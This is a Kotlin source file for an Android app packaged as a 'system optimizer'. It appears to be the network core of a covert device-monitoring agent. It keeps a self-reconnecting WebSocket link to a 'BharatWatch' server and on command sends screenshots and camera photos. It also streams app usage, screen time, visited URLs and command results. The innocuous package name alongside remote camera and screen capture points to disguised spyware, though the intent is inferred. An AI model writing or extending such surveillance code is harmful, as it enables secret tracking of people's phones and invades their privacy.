package com.system.optimizer.network

import android.util.Log
import com.system.optimizer.Config
import okhttp3.*
import org.json.JSONArray
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.TimeUnit

/**
 * Manages the persistent WebSocket connection to the BharatWatch server.
 * Handles auto-reconnection with exponential backoff.
 */
class WebSocketManager(
    private val onMessage: (JSONObject) -> Unit,
    private val onConnected: () -> Unit,
    private val onDisconnected: () -> Unit
) {
    companion object {
        @Volatile
        private var instance: WebSocketManager? = null

        fun getInstance(): WebSocketManager? = instance
    }

    init {
        instance = this
    }

    private val TAG = "WSManager"

    private val client = OkHttpClient.Builder()
        .readTimeout(0, TimeUnit.MILLISECONDS)
        .pingInterval(20, TimeUnit.SECONDS)
        .retryOnConnectionFailure(true)
        .build()

    private var webSocket: WebSocket? = null
    @Volatile private var connected = false
    private var reconnectAttempt = 0
    @Volatile private var shouldReconnect = true

    private val isoFormat = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).apply {
        timeZone = TimeZone.getTimeZone("UTC")
    }
    private val localDateFormat = SimpleDateFormat("yyyy-MM-dd", Locale.US)

    // ═══════════════════════════════════════════
    //  Connect / Disconnect
    // ═══════════════════════════════════════════

    fun connect() {
        shouldReconnect = true
        doConnect()
    }

    private fun doConnect() {
        if (connected) return

        val url = "${Config.SERVER_URL}?key=${Config.AGENT_KEY}"
        Log.i(TAG, "Connecting to $url")

        val request = Request.Builder().url(url).build()

        webSocket = client.newWebSocket(request, object : WebSocketListener() {
            override fun onOpen(ws: WebSocket, response: Response) {
                Log.i(TAG, "✅ Connected to server")
                connected = true
                reconnectAttempt = 0
                onConnected()
            }

            override fun onMessage(ws: WebSocket, text: String) {
                try {
                    onMessage(JSONObject(text))
                } catch (e: Exception) {
                    Log.e(TAG, "Parse error: ${e.message}")
                }
            }

            override fun onClosing(ws: WebSocket, code: Int, reason: String) {
                ws.close(1000, null)
            }

            override fun onClosed(ws: WebSocket, code: Int, reason: String) {
                Log.i(TAG, "Connection closed: $reason")
                connected = false
                onDisconnected()
                scheduleReconnect()
            }

            override fun onFailure(ws: WebSocket, t: Throwable, response: Response?) {
                Log.e(TAG, "Connection failed: ${t.message}")
                connected = false
                onDisconnected()
                scheduleReconnect()
            }
        })
    }

    fun disconnect() {
        shouldReconnect = false
        webSocket?.close(1000, "Agent stopping")
        webSocket = null
        connected = false
    }

    fun isConnected() = connected

    // ═══════════════════════════════════════════
    //  Reconnection with exponential backoff
    // ═══════════════════════════════════════════

    private fun scheduleReconnect() {
        if (!shouldReconnect) return
        val delay = minOf(
            Config.RECONNECT_BASE_DELAY * (1L shl minOf(reconnectAttempt, 5)),
            Config.RECONNECT_MAX_DELAY
        )
        reconnectAttempt++
        Log.i(TAG, "Reconnecting in ${delay / 1000}s (attempt #$reconnectAttempt)")
        Thread {
            try {
                Thread.sleep(delay)
                if (shouldReconnect && !connected) doConnect()
            } catch (_: InterruptedException) {}
        }.start()
    }

    // ═══════════════════════════════════════════
    //  Send messages
    // ═══════════════════════════════════════════

    private fun send(json: JSONObject): Boolean {
        if (!connected || webSocket == null) return false
        return webSocket?.send(json.toString()) ?: false
    }

    fun sendHeartbeat(battery: Int, currentApp: String?, currentPackage: String?, screenOn: Boolean) {
        send(JSONObject().apply {
            put("type", "heartbeat")
            put("battery", battery)
            put("currentApp", currentApp ?: "")
            put("currentPackage", currentPackage ?: "")
            put("screenOn", screenOn)
        })
    }

    fun sendScreenshot(base64Data: String, commandId: String?) {
        send(JSONObject().apply {
            put("type", "screenshot")
            put("data", base64Data)
            if (commandId != null) put("commandId", commandId)
        })
    }

    fun sendCameraPhoto(base64Data: String, commandId: String?, cameraType: String) {
        send(JSONObject().apply {
            put("type", "camera_photo")
            put("data", base64Data)
            put("cameraType", cameraType)
            if (commandId != null) put("commandId", commandId)
        })
    }

    fun sendApps(apps: List<Map<String, Any>>) {
        send(JSONObject().apply {
            put("type", "apps")
            put("apps", JSONArray().apply {
                apps.forEach { app ->
                    put(JSONObject().apply {
                        put("name", app["name"] ?: "")
                        put("package", app["package"] ?: "")
                        put("isForeground", app["isForeground"] ?: false)
                    })
                }
            })
        })
    }

    fun sendActivity(appName: String, packageName: String, eventType: String) {
        send(JSONObject().apply {
            put("type", "activity")
            put("appName", appName)
            put("packageName", packageName)
            put("eventType", eventType)
            put("timestamp", isoFormat.format(Date()))
            put("date", localDateFormat.format(Date()))
        })
    }

    fun sendScreenTimeUpdate(entries: List<Map<String, Any>>) {
        send(JSONObject().apply {
            put("type", "screen_time_update")
            put("date", localDateFormat.format(Date()))
            put("entries", JSONArray().apply {
                entries.forEach { e ->
                    put(JSONObject().apply {
                        put("name", e["name"] ?: "")
                        put("package", e["package"] ?: "")
                        put("seconds", e["seconds"] ?: 0)
                    })
                }
            })
        })
    }

    fun sendCommandResult(commandId: String, success: Boolean, result: String? = null) {
        send(JSONObject().apply {
            put("type", "command_result")
            put("commandId", commandId)
            put("success", success)
            if (result != null) put("result", result)
        })
    }

    fun sendWebActivity(domain: String, url: String, durationSeconds: Int, visitId: String) {
        send(JSONObject().apply {
            put("type", "web_activity")
            put("domain", domain)
            put("url", url)
            put("duration", durationSeconds)
            put("visitId", visitId)
            put("timestamp", isoFormat.format(Date()))
        })
    }

    fun sendBlockedAttempt(packageName: String, appName: String, reason: String) {
        send(JSONObject().apply {
            put("type", "blocked_attempt")
            put("package", packageName)
            put("appName", appName)
            put("reason", reason)
            put("timestamp", isoFormat.format(Date()))
        })
    }
}
